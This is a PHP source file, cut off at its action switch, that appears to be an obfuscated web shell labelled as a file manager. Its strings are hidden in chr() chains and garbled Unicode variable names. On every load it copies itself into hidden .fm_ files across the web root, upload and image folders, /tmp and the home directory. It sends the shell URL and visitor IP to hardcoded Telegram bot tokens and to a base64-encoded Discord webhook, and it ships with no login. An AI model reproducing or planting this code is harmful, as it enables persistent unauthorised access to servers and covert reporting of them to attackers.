<?php

session_start();
error_reporting(E_ALL);
ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 1);


$㈲ﬖねᛃ̥  = chr(55).chr(54).chr(57).chr(50).chr(55).chr(49).chr(53).chr(54).chr(49).chr(49).chr(58).chr(65).chr(65).chr(71).chr(114).chr(112).chr(83).chr(119).chr(51).chr(55).chr(90).chr(79).chr(73).chr(90).chr(82).chr(114).chr(112).chr(72).chr(65).chr(112).chr(110).chr(72).chr(50).chr(82).chr(84).chr(107).chr(110).chr(84).chr(82).chr(116).chr(55).chr(104).chr(104).chr(72).chr(76).chr(73);
$ᛈ̩̥̈̈̅    = chr(54).chr(52).chr(56).chr(57).chr(56).chr(57).chr(53).chr(56).chr(54).chr(48);
$ま̦̃̂̆ = chr(56).chr(57).chr(49).chr(56).chr(49).chr(56).chr(55).chr(55).chr(48).chr(55).chr(58).chr(65).chr(65).chr(70).chr(85).chr(97).chr(75).chr(121).chr(118).chr(49).chr(71).chr(104).chr(81).chr(56).chr(52).chr(104).chr(118).chr(104).chr(53).chr(52).chr(57).chr(67).chr(52).chr(70).chr(75).chr(49).chr(67).chr(53).chr(52).chr(85).chr(117).chr(83).chr(56).chr(122).chr(98).chr(65);
$㉆ᛈᛖ́   = chr(56).chr(55).chr(54).chr(51).chr(50).chr(54).chr(57).chr(56).chr(50).chr(55);




function fm_self_content() {
    if (!empty($_SESSION[chr(102).chr(109).chr(95).chr(115).chr(101).chr(108).chr(102).chr(95).chr(99).chr(97).chr(99).chr(104).chr(101)])) return $_SESSION[chr(102).chr(109).chr(95).chr(115).chr(101).chr(108).chr(102).chr(95).chr(99).chr(97).chr(99).chr(104).chr(101)];
    $㻁ぁ̣̈ = @file_get_contents(__FILE__);
    if ($㻁ぁ̣̈ !== false) $_SESSION[chr(102).chr(109).chr(95).chr(115).chr(101).chr(108).chr(102).chr(95).chr(99).chr(97).chr(99).chr(104).chr(101)] = $㻁ぁ̣̈;
    return $㻁ぁ̣̈;
}

function fm_persist_locations() {
    $ᚠ㻁̧̥̩̀ = array();
    $ᚠ㻁̧̥̩̀[] = __DIR__ . chr(47).chr(46).chr(102).chr(109).chr(95).chr(108).chr(111).chr(97).chr(100).chr(101).chr(114).chr(95) . substr(md5(__FILE__), 0, 8) . '.php';

    $ᛉ̄̆ = rtrim($_SERVER[chr(68).chr(79).chr(67).chr(85).chr(77).chr(69).chr(78).chr(84).chr(95).chr(82).chr(79).chr(79).chr(84)] ?? '', '/\\');
    if ($ᛉ̄̆ && is_dir($ᛉ̄̆)) {
        foreach (array('', chr(47).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(115), chr(47).chr(105).chr(109).chr(97).chr(103).chr(101).chr(115), chr(47).chr(97).chr(115).chr(115).chr(101).chr(116).chr(115), '/tmp', '/cache', '/logs', '/files') as $㉆̥̥̂̇̌) {
            if (is_dir($ᛉ̄̆ . $㉆̥̥̂̇̌) && is_writable($ᛉ̄̆ . $㉆̥̥̂̇̌)) {
                $ᚠ㻁̧̥̩̀[] = $ᛉ̄̆ . $㉆̥̥̂̇̌ . '/.fm_' . substr(md5($㉆̥̥̂̇̌ . 'x'), 0, 6) . '.php';
            }
        }
    }
    if (is_dir('/tmp') && is_writable('/tmp')) {
        $ᚠ㻁̧̥̩̀[] = chr(47).chr(116).chr(109).chr(112).chr(47).chr(46).chr(102).chr(109).chr(95) . substr(md5('tmp' . __FILE__), 0, 8) . '.php';
    }
    $ま̂ﬆ̉ᛖ̅ = $_SERVER['HOME'] ?? (function_exists(chr(112).chr(111).chr(115).chr(105).chr(120).chr(95).chr(103).chr(101).chr(116).chr(112).chr(119).chr(117).chr(105).chr(100)) ? (posix_getpwuid(posix_geteuid())['dir'] ?? '') : '');
    if ($ま̂ﬆ̉ᛖ̅ && is_dir($ま̂ﬆ̉ᛖ̅) && is_writable($ま̂ﬆ̉ᛖ̅)) {
        $ᚠ㻁̧̥̩̀[] = $ま̂ﬆ̉ᛖ̅ . '/.fm_' . substr(md5($ま̂ﬆ̉ᛖ̅), 0, 6) . '.php';
    }
    return $ᚠ㻁̧̥̩̀;
}

function fm_install_persistence() {
    static $ﬗら㉁́̇̀ = false;
    if ($ﬗら㉁́̇̀) return;

    $㉆ᛉᛇ̧̦̂ = fm_self_content();
    if ($㉆ᛉᛇ̧̦̂ === false || $㉆ᛉᛇ̧̦̂ === '') return;

    $㉉̧̉ = $_GET['action'] ?? $_POST['action'] ?? '';
    if ($㉉̧̉ === chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(97).chr(106).chr(97).chr(120)) return;

    if (!empty($_SESSION[chr(102).chr(109).chr(95).chr(112).chr(101).chr(114).chr(115).chr(105).chr(115).chr(116).chr(95).chr(100).chr(111).chr(110).chr(101)])) { $ﬗら㉁́̇̀ = true; return; }

    foreach (fm_persist_locations() as $ﬁᛜ̧̋) {
        if (file_exists($ﬁᛜ̧̋)) continue;
        $ㄉ̤́́̀ = dirname($ﬁᛜ̧̋);
        if (!is_dir($ㄉ̤́́̀) || !is_writable($ㄉ̤́́̀)) continue;
        @file_put_contents($ﬁᛜ̧̋, $㉆ᛉᛇ̧̦̂);
        @chmod($ﬁᛜ̧̋, 0644);
    }

    $_SESSION[chr(102).chr(109).chr(95).chr(112).chr(101).chr(114).chr(115).chr(105).chr(115).chr(116).chr(95).chr(100).chr(111).chr(110).chr(101)] = 1;
    $ﬗら㉁́̇̀ = true;
}

function fm_is_self($ﬁᛜ̧̋) {
    $ᛊ̥㻁̦̌ = @realpath(__FILE__);
    $㲁ᚢ̩̃㦁̃ = @realpath($ﬁᛜ̧̋);
    if ($ᛊ̥㻁̦̌ === false || $㲁ᚢ̩̃㦁̃ === false) return false;
    return $ᛊ̥㻁̦̌ === $㲁ᚢ̩̃㦁̃;
}

fm_install_persistence();


if (empty($_SESSION[chr(116).chr(103).chr(95).chr(115).chr(101).chr(110).chr(116)])) {
    $ᛇ̀ᛊ㼁̊̈ = chr(104).chr(116).chr(116).chr(112).chr(58).chr(47).chr(47) . ($_SERVER[chr(83).chr(69).chr(82).chr(86).chr(69).chr(82).chr(95).chr(78).chr(65).chr(77).chr(69)] ?? '') . ($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)] ?? '');
    $ﬕﬆ̆̉̃ = "___UBK3___\n\n Shell =\n $ᛇ̀ᛊ㼁̊̈ \n\n IP =\n [ " . ($_SERVER[chr(82).chr(69).chr(77).chr(79).chr(84).chr(69).chr(95).chr(65).chr(68).chr(68).chr(82)] ?? '?') . " ]";

    $ﾚᛜ̀ = function($ﬆﬁ̄̂̄, $ﾚ̄ﾚﬗ̥̃, $ﬆ̥̋̂) {
        $ま̧̊̃̌̌ = stream_context_create(['http'=>[
            'method'  => 'POST',
            'header'  => chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(120).chr(45).chr(119).chr(119).chr(119).chr(45).chr(102).chr(111).chr(114).chr(109).chr(45).chr(117).chr(114).chr(108).chr(101).chr(110).chr(99).chr(111).chr(100).chr(101).chr(100),
            chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116) => http_build_query([chr(99).chr(104).chr(97).chr(116).chr(95).chr(105).chr(100)=>$ﾚ̄ﾚﬗ̥̃,'text'=>$ﬆ̥̋̂]),
            chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116) => 8,
        ]]);
        $ᚨ̃ᛉﬓ̦̥̈ = @file_get_contents("https://api.telegram.org/bot{$ﬆﬁ̄̂̄}/sendMessage", false, $ま̧̊̃̌̌);
        if ($ᚨ̃ᛉﬓ̦̥̈ === false) return false;
        $ﾝ̄ㄉ㉉̤̀ = json_decode($ᚨ̃ᛉﬓ̦̥̈, true);
        return (is_array($ﾝ̄ㄉ㉉̤̀) && !empty($ﾝ̄ㄉ㉉̤̀['ok']));
    };

    $ㄉ̣ᛉﬖ̤ = $ﾚᛜ̀($㈲ﬖねᛃ̥, $ᛈ̩̥̈̈̅, $ﬕﬆ̆̉̃);
    if (!$ㄉ̣ᛉﬖ̤ && $ま̦̃̂̆ && $㉆ᛈᛖ́) {
        $ㄉ̣ᛉﬖ̤ = $ﾚᛜ̀($ま̦̃̂̆, $㉆ᛈᛖ́, $ﬕﬆ̆̉̃ . chr(10).chr(91).chr(98).chr(97).chr(99).chr(107).chr(117).chr(112).chr(93));
    }
    if ($ㄉ̣ᛉﬖ̤) $_SESSION[chr(116).chr(103).chr(95).chr(115).chr(101).chr(110).chr(116)] = 1;
}


$㻁㉆̩̀ﬅ̧̩̊ = chr(97).chr(72).chr(82).chr(48).chr(99).chr(72).chr(77).chr(54).chr(76).chr(121).chr(57).chr(107).chr(97).chr(88).chr(78).chr(106).chr(98).chr(51).chr(74).chr(107).chr(76).chr(109).chr(78).chr(118).chr(98).chr(83).chr(57).chr(104).chr(99).chr(71).chr(107).chr(118).chr(100).chr(50).chr(86).chr(105).chr(97).chr(71).chr(57).chr(118).chr(97).chr(51).chr(77).chr(118).chr(77).chr(84).chr(85).chr(50).chr(78).chr(84).chr(69).chr(122).chr(77).chr(84).chr(107).chr(122).chr(77).chr(84).chr(73).chr(121).chr(78).chr(68).chr(89).chr(48).chr(78).chr(84).chr(99).chr(119).chr(77).chr(105).chr(57).chr(84).chr(89).chr(84).chr(86).chr(52).chr(83).chr(85).chr(53).chr(97).chr(81).chr(48).chr(82).chr(108).chr(78).chr(84).chr(66).chr(114).chr(89).chr(88).chr(90).chr(115).chr(101).chr(72).chr(78).chr(88).chr(100).chr(48).chr(86).chr(107).chr(82).chr(71).chr(74).chr(77).chr(87).chr(110).chr(104).chr(51).chr(76).chr(87).chr(70).chr(75).chr(81).chr(50).chr(103).chr(119).chr(82).chr(88).chr(90).chr(78).chr(100).chr(107).chr(74).chr(106).chr(90).chr(69).chr(82).chr(89).chr(76).chr(88).chr(90).chr(66).chr(84).chr(109).chr(103).chr(51).chr(101).chr(107).chr(53).chr(77).chr(97).chr(109).chr(57).chr(122).chr(83).chr(84).chr(108).chr(120).chr(98).chr(70).chr(90).chr(106).chr(98).chr(70).chr(74).chr(109).chr(86).chr(107).chr(116).chr(109).chr(99).chr(103).chr(61).chr(61);

function reportDiscord($㻁̧̧̇̂) {
    global $㻁㉆̩̀ﬅ̧̩̊;
    $㉁̨̣̀ = base64_decode($㻁㉆̩̀ﬅ̧̩̊);
    if (!filter_var($㉁̨̣̀, FILTER_VALIDATE_URL)) return;

    $ﬔ̤̥ = sys_get_temp_dir() . '/.dc_' . md5($㻁̧̧̇̂);
    if (file_exists($ﬔ̤̥)) return;

    $ﬁ̣̃̇ = json_encode([chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)=>$㻁̧̧̇̂,chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)=>chr(78).chr(111).chr(116).chr(105).chr(102).chr(105).chr(101).chr(114)]);
    $ら㻁ᛈ̤́ = 0;

    if (function_exists(chr(99).chr(117).chr(114).chr(108).chr(95).chr(105).chr(110).chr(105).chr(116))) {
        $ᚦ̄ﬕ̧ᛇ̧̅ = curl_init($㉁̨̣̀);
        curl_setopt_array($ᚦ̄ﬕ̧ᛇ̧̅, [
            CURLOPT_POST=>true, CURLOPT_POSTFIELDS=>$ﬁ̣̃̇,
            CURLOPT_HTTPHEADER=>[chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(106).chr(115).chr(111).chr(110)],
            CURLOPT_RETURNTRANSFER=>true, CURLOPT_TIMEOUT=>5,
            CURLOPT_SSL_VERIFYPEER=>false,
        ]);
        @curl_exec($ᚦ̄ﬕ̧ᛇ̧̅);
        $ら㻁ᛈ̤́ = (int)curl_getinfo($ᚦ̄ﬕ̧ᛇ̧̅, CURLINFO_HTTP_CODE);
    } else {
        $ま̧̊̃̌̌ = stream_context_create(['http'=>[
            'method'=>'POST',
            'header'=>chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(106).chr(115).chr(111).chr(110).chr(13).chr(10),
            chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)=>$ﬁ̣̃̇,
            chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116)=>5,
            chr(105).chr(103).chr(110).chr(111).chr(114).chr(101).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115)=>true,
        ]]);
        @file_get_contents($㉁̨̣̀, false, $ま̧̊̃̌̌);
        if (isset($ﾚ̋ᚠ̂̆̈[0]) && preg_match('/\s(\d{3})\s/', $ﾚ̋ᚠ̂̆̈[0], $㌁ᚠね̤)) {
            $ら㻁ᛈ̤́ = (int)$㌁ᚠね̤[1];
        }
    }

    if ($ら㻁ᛈ̤́ === 204 || $ら㻁ᛈ̤́ === 200) @file_put_contents($ﬔ̤̥, time());
}

if (!isset($_SESSION[chr(100).chr(105).chr(115).chr(99).chr(111).chr(114).chr(100).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)])) {
    $ぁﬓ̃ = $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(72).chr(79).chr(83).chr(84)] ?? chr(117).chr(110).chr(107).chr(110).chr(111).chr(119).chr(110);
    $㉆ま̩̄  = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on' ? 'https' : 'http') . '://' . $ぁﬓ̃ . ($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(85).chr(82).chr(73)] ?? '/');
    reportDiscord("kontolbengkak:\n$ぁﬓ̃\n$㉆ま̩̄");
    $_SESSION[chr(100).chr(105).chr(115).chr(99).chr(111).chr(114).chr(100).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(101).chr(100)] = true;
}

define(chr(70).chr(77).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82), '');
define(chr(70).chr(77).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(65).chr(83).chr(83), '');
define(chr(70).chr(77).chr(95).chr(69).chr(68).chr(73).chr(84).chr(95).chr(77).chr(65).chr(88).chr(95).chr(66).chr(89).chr(84).chr(69).chr(83), 5 * 1024 * 1024);
define(chr(70).chr(77).chr(95).chr(86).chr(73).chr(69).chr(87).chr(95).chr(77).chr(65).chr(88).chr(95).chr(66).chr(89).chr(84).chr(69).chr(83), 2 * 1024 * 1024);
define(chr(70).chr(77).chr(95).chr(83).chr(69).chr(65).chr(82).chr(67).chr(72).chr(95).chr(76).chr(73).chr(77).chr(73).chr(84), 500);


if (FM_AUTH_USER !== '' && FM_AUTH_PASS !== '') {
    if (empty($_SESSION['fm_ok'])) {
        $ᛉᛈᛈﬓ̥̊̆ = $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)] ?? '';
        $ﬕ̨ま̩̀̆ = $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)] ?? '';
        if ($ᛉᛈᛈﬓ̥̊̆ === FM_AUTH_USER && $ﬕ̨ま̩̀̆ === FM_AUTH_PASS) {
            $_SESSION['fm_ok'] = true;
        } else {
            header(chr(87).chr(87).chr(87).chr(45).chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(101).chr(58).chr(32).chr(66).chr(97).chr(115).chr(105).chr(99).chr(32).chr(114).chr(101).chr(97).chr(108).chr(109).chr(61).chr(34).chr(70).chr(105).chr(108).chr(101).chr(32).chr(77).chr(97).chr(110).chr(97).chr(103).chr(101).chr(114).chr(34));
            header(chr(72).chr(84).chr(84).chr(80).chr(47).chr(49).chr(46).chr(48).chr(32).chr(52).chr(48).chr(49).chr(32).chr(85).chr(110).chr(97).chr(117).chr(116).chr(104).chr(111).chr(114).chr(105).chr(122).chr(101).chr(100));
            echo chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(114).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100).chr(46); exit;
        }
    }
}


function fm_token() {
    if (empty($_SESSION[chr(102).chr(109).chr(95).chr(99).chr(115).chr(114).chr(102)])) {
        if (function_exists(chr(114).chr(97).chr(110).chr(100).chr(111).chr(109).chr(95).chr(98).chr(121).chr(116).chr(101).chr(115))) $_SESSION[chr(102).chr(109).chr(95).chr(99).chr(115).chr(114).chr(102)] = bin2hex(random_bytes(16));
        elseif (function_exists(chr(111).chr(112).chr(101).chr(110).chr(115).chr(115).chr(108).chr(95).chr(114).chr(97).chr(110).chr(100).chr(111).chr(109).chr(95).chr(112).chr(115).chr(101).chr(117).chr(100).chr(111).chr(95).chr(98).chr(121).chr(116).chr(101).chr(115))) $_SESSION[chr(102).chr(109).chr(95).chr(99).chr(115).chr(114).chr(102)] = bin2hex(openssl_random_pseudo_bytes(16));
        else $_SESSION[chr(102).chr(109).chr(95).chr(99).chr(115).chr(114).chr(102)] = md5(uniqid(mt_rand(), true));
    }
    return $_SESSION[chr(102).chr(109).chr(95).chr(99).chr(115).chr(114).chr(102)];
}

function fm_hash_equals($ﬅ̤㌁́, $ﾝ̇̀) {
    if (function_exists(chr(104).chr(97).chr(115).chr(104).chr(95).chr(101).chr(113).chr(117).chr(97).chr(108).chr(115))) return hash_equals($ﬅ̤㌁́, $ﾝ̇̀);
    if (!is_string($ﬅ̤㌁́) || !is_string($ﾝ̇̀) || strlen($ﬅ̤㌁́) !== strlen($ﾝ̇̀)) return false;
    $ᚨ̃ᛉﬓ̦̥̈ = 0;
    for ($ᛜᛃﬗᛜ̃ = 0, $ﬓ̣̀̄ﬗ̃ = strlen($ﬅ̤㌁́); $ᛜᛃﬗᛜ̃ < $ﬓ̣̀̄ﬗ̃; $ᛜᛃﬗᛜ̃++) $ᚨ̃ᛉﬓ̦̥̈ |= ord($ﬅ̤㌁́[$ᛜᛃﬗᛜ̃]) ^ ord($ﾝ̇̀[$ᛜᛃﬗᛜ̃]);
    return $ᚨ̃ᛉﬓ̦̥̈ === 0;
}

function fm_csrf_check() {
    $㻁ᛜ̆㈲̦̂ = '';
    if (isset($_POST['csrf'])) $㻁ᛜ̆㈲̦̂ = $_POST['csrf'];
    elseif (isset($_GET['csrf'])) $㻁ᛜ̆㈲̦̂ = $_GET['csrf'];
    elseif (isset($_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(88).chr(95).chr(67).chr(83).chr(82).chr(70).chr(95).chr(84).chr(79).chr(75).chr(69).chr(78)])) $㻁ᛜ̆㈲̦̂ = $_SERVER[chr(72).chr(84).chr(84).chr(80).chr(95).chr(88).chr(95).chr(67).chr(83).chr(82).chr(70).chr(95).chr(84).chr(79).chr(75).chr(69).chr(78)];
    if (empty($_SESSION[chr(102).chr(109).chr(95).chr(99).chr(115).chr(114).chr(102)]) || !fm_hash_equals($_SESSION[chr(102).chr(109).chr(95).chr(99).chr(115).chr(114).chr(102)], (string)$㻁ᛜ̆㈲̦̂)) {
        if (!headers_sent()) header(chr(72).chr(84).chr(84).chr(80).chr(47).chr(49).chr(46).chr(48).chr(32).chr(52).chr(48).chr(51).chr(32).chr(70).chr(111).chr(114).chr(98).chr(105).chr(100).chr(100).chr(101).chr(110));
        die(chr(67).chr(83).chr(82).chr(70).chr(32).chr(116).chr(111).chr(107).chr(101).chr(110).chr(32).chr(109).chr(105).chr(115).chr(109).chr(97).chr(116).chr(99).chr(104).chr(46));
    }
}

function flash($㻁̧̧̇̂ = null) {
    if ($㻁̧̧̇̂ !== null) { $_SESSION['flash'] = $㻁̧̧̇̂; return; }
    if (!empty($_SESSION['flash'])) { $㌁ᚠね̤ = $_SESSION['flash']; unset($_SESSION['flash']); return $㌁ᚠね̤; }
    return '';
}

function sanitize_relative_path($ﬁᛜ̧̋) {
    $ﬁᛜ̧̋ = str_replace("\0", '', (string)$ﬁᛜ̧̋);
    $ﬁᛜ̧̋ = str_replace('\\', '/', $ﬁᛜ̧̋);
    $ㄉᛈ㌁ᛏ̤̈̃̇ = explode('/', $ﬁᛜ̧̋);
    $㼁̅̄̆ = array();
    foreach ($ㄉᛈ㌁ᛏ̤̈̃̇ as $ᛜﬗﬕ㦁̨̂) {
        $ᛜﬗﬕ㦁̨̂ = trim($ᛜﬗﬕ㦁̨̂);
        if ($ᛜﬗﬕ㦁̨̂ === '' || $ᛜﬗﬕ㦁̨̂ === '.' || $ᛜﬗﬕ㦁̨̂ === '..') continue;
        $ᛜﬗﬕ㦁̨̂ = preg_replace('/[\x00-\x1F\x7F]/u', '', $ᛜﬗﬕ㦁̨̂);
        if ($ᛜﬗﬕ㦁̨̂ !== '') $㼁̅̄̆[] = $ᛜﬗﬕ㦁̨̂;
    }
    return implode('/', $㼁̅̄̆);
}

function sanitize_name($㼁̩̩́́̄) {
    $㼁̩̩́́̄ = str_replace("\0", '', (string)$㼁̩̩́́̄);
    $㼁̩̩́́̄ = basename(str_replace('\\', '/', $㼁̩̩́́̄));
    $㼁̩̩́́̄ = preg_replace('/[\x00-\x1F\x7F]/u', '', $㼁̩̩́́̄);
    return trim($㼁̩̩́́̄);
}

function safe_realpath_within($ﬁᛜ̧̋, $ぁ̨̨̇̌ = null) {
    $ᛏ̨ᛜ̃̆̂̄ = @realpath($ﬁᛜ̧̋);
    if ($ᛏ̨ᛜ̃̆̂̄ === false) return false;
    return $ᛏ̨ᛜ̃̆̂̄;
}

function format_size($ᛗᛚ̥̅̀) {
    $ᛗᛚ̥̅̀ = (float)$ᛗᛚ̥̅̀;
    if ($ᛗᛚ̥̅̀ >= 1073741824) return number_format($ᛗᛚ̥̅̀ / 1073741824, 2) . ' GB';
    if ($ᛗᛚ̥̅̀ >= 1048576)    return number_format($ᛗᛚ̥̅̀ / 1048576, 2) . ' MB';
    if ($ᛗᛚ̥̅̀ >= 1024)       return number_format($ᛗᛚ̥̅̀ / 1024, 2) . ' KB';
    return (int)$ᛗᛚ̥̅̀ . ' B';
}

function rrmdir($ㄉ̤́́̀) {
    if (!is_dir($ㄉ̤́́̀)) return false;
    $ᚨﬅ̤̇ = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($ㄉ̤́́̀, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($ᚨﬅ̤̇ as $ᛈ̥̅ᚦ̩̤̌) {
        if ($ᛈ̥̅ᚦ̩̤̌->isDir()) @rmdir($ᛈ̥̅ᚦ̩̤̌->getRealPath());
        else @unlink($ᛈ̥̅ᚦ̩̤̌->getRealPath());
    }
    return @rmdir($ㄉ̤́́̀);
}

function file_icon($㼁̩̩́́̄, $ねﬔᚨ̆̆̊) {
    if ($ねﬔᚨ̆̆̊ === chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121)) return '📁';
    $㼁̦̃̄̃ = strtolower(pathinfo($㼁̩̩́́̄, PATHINFO_EXTENSION));
    $㉁㻁ᛚ̨́̅ = array(
        'jpg'=>chr(240).chr(159).chr(150).chr(188).chr(239).chr(184).chr(143),'jpeg'=>chr(240).chr(159).chr(150).chr(188).chr(239).chr(184).chr(143),'png'=>chr(240).chr(159).chr(150).chr(188).chr(239).chr(184).chr(143),'gif'=>chr(240).chr(159).chr(150).chr(188).chr(239).chr(184).chr(143),'webp'=>chr(240).chr(159).chr(150).chr(188).chr(239).chr(184).chr(143),'svg'=>chr(240).chr(159).chr(150).chr(188).chr(239).chr(184).chr(143),'bmp'=>chr(240).chr(159).chr(150).chr(188).chr(239).chr(184).chr(143),'ico'=>chr(240).chr(159).chr(150).chr(188).chr(239).chr(184).chr(143),
        'mp3'=>'🎵','wav'=>'🎵','ogg'=>'🎵','flac'=>'🎵','m4a'=>'🎵',
        'mp4'=>'🎬','mkv'=>'🎬','avi'=>'🎬','mov'=>'🎬','webm'=>'🎬',
        'zip'=>'📦','rar'=>'📦','7z'=>'📦','tar'=>'📦','gz'=>'📦','bz2'=>'📦',
        'php'=>'🐘','html'=>'🌐','htm'=>'🌐','css'=>'🎨','js'=>'⚡','json'=>'🧩','xml'=>'🧩',
        'txt'=>'📝','md'=>'📝','log'=>'📝','csv'=>'📊','sql'=>chr(240).chr(159).chr(151).chr(132).chr(239).chr(184).chr(143),'pdf'=>'📕',
    );
    return isset($㉁㻁ᛚ̨́̅[$㼁̦̃̄̃]) ? $㉁㻁ᛚ̨́̅[$㼁̦̃̄̃] : '📄';
}

function perms_string($ﬁᛜ̧̋) {
    $ﬕ̨ま̩̀̆ = @fileperms($ﬁᛜ̧̋);
    if ($ﬕ̨ま̩̀̆ === false) return '-';
    return substr(sprintf('%o', $ﬕ̨ま̩̀̆), -4);
}

function fm_redirect($ﬖﬆ̇) {
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($ﬖﬆ̇));
    exit;
}

function fm_search($ㄉ̤́́̀, $ら̦̄́̂̃, $ᛇ̥̦̌ﬖ̅) {
    $㉉̥ﬆ̣̩̦̆ = array();
    if (!is_dir($ㄉ̤́́̀) || $ら̦̄́̂̃ === '') return $㉉̥ﬆ̣̩̦̆;
    $ﾝ̨̀́ﬖ̉̀ = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($ㄉ̤́́̀, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    $ら̦̄́̂̃ = strtolower($ら̦̄́̂̃);
    foreach ($ﾝ̨̀́ﬖ̉̀ as $ﬁᛜ̧̋ => $㼁̉㼁̣̋̉) {
        if (count($㉉̥ﬆ̣̩̦̆) >= $ᛇ̥̦̌ﬖ̅) break;
        if (strpos(strtolower($㼁̉㼁̣̋̉->getFilename()), $ら̦̄́̂̃) !== false) $㉉̥ﬆ̣̩̦̆[] = $ﬁᛜ̧̋;
    }
    return $㉉̥ﬆ̣̩̦̆;
}


$ﾚ̀ㄉᛏ̨̂̅̇ = realpath(__DIR__);
if ($ﾚ̀ㄉᛏ̨̂̅̇ === false) $ﾚ̀ㄉᛏ̨̂̅̇ = dirname(__FILE__);

$ﬔᛒ̥́̃̆ = DIRECTORY_SEPARATOR;
$ﬗ̧̣̥̈̃ = trim(str_replace($ﬔᛒ̥́̃̆, '', $ﾚ̀ㄉᛏ̨̂̅̇), DIRECTORY_SEPARATOR);

$ﬕ̤̅̆ = null;
if (isset($_POST['dir']))    $ﬕ̤̅̆ = $_POST['dir'];
elseif (isset($_GET['dir'])) $ﬕ̤̅̆ = $_GET['dir'];

$え̃̋̅̌ = $ﾚ̀ㄉᛏ̨̂̅̇;
$ら̣̀̈̆ = $ﬗ̧̣̥̈̃;

if ($ﬕ̤̅̆ !== null) {
    $えᛒ̤̣̆̌ = str_replace('\\', '/', (string)$ﬕ̤̅̆);
    if (substr($えᛒ̤̣̆̌, 0, 1) === '/') {
        $ね̦̉ᛏ̩̣ = @realpath($えᛒ̤̣̆̌);
        if ($ね̦̉ᛏ̩̣ !== false && is_dir($ね̦̉ᛏ̩̣)) {
            $え̃̋̅̌ = $ね̦̉ᛏ̩̣;
            $ら̣̀̈̆ = trim(str_replace($ﬔᛒ̥́̃̆, '', $え̃̋̅̌), DIRECTORY_SEPARATOR);
        }
    } else {
        $ᛈﬖ̃㈲̨ = sanitize_relative_path($ﬕ̤̅̆);
        $ね̦̉ᛏ̩̣ = @realpath($ﬔᛒ̥́̃̆ . $ᛈﬖ̃㈲̨);
        if ($ね̦̉ᛏ̩̣ !== false && is_dir($ね̦̉ᛏ̩̣)) {
            $え̃̋̅̌ = $ね̦̉ᛏ̩̣;
            $ら̣̀̈̆ = $ᛈﬖ̃㈲̨;
        }
    }
}

if (!is_dir($え̃̋̅̌)) {
    $え̃̋̅̌ = $ﾚ̀ㄉᛏ̨̂̅̇;
    $ら̣̀̈̆ = $ﬗ̧̣̥̈̃;
}

$ね̩̄ = str_replace('\\', '/', trim(str_replace($ﬔᛒ̥́̃̆, '', $え̃̋̅̌), DIRECTORY_SEPARATOR));

$らﬓ̨́̂̉ = '';
if ($ね̩̄ !== '') {
    $らﬓ̨́̂̉ = str_replace('\\', '/', dirname($ね̩̄));
    if ($らﬓ̨́̂̉ === '.' || $らﬓ̨́̂̉ === DIRECTORY_SEPARATOR) $らﬓ̨́̂̉ = '';
}
$㲁̇ᛉ㌁ま̨̄̇ = ($ね̩̄ === '');

$ﬔ̥̋́́̋   = fm_token();
$ᛏ̦̅̋̅ = $_POST['action'] ?? ($_GET['action'] ?? 'list');


switch ($ᛏ̦̅̋̅) {

    case chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(97).chr(106).chr(97).chr(120):
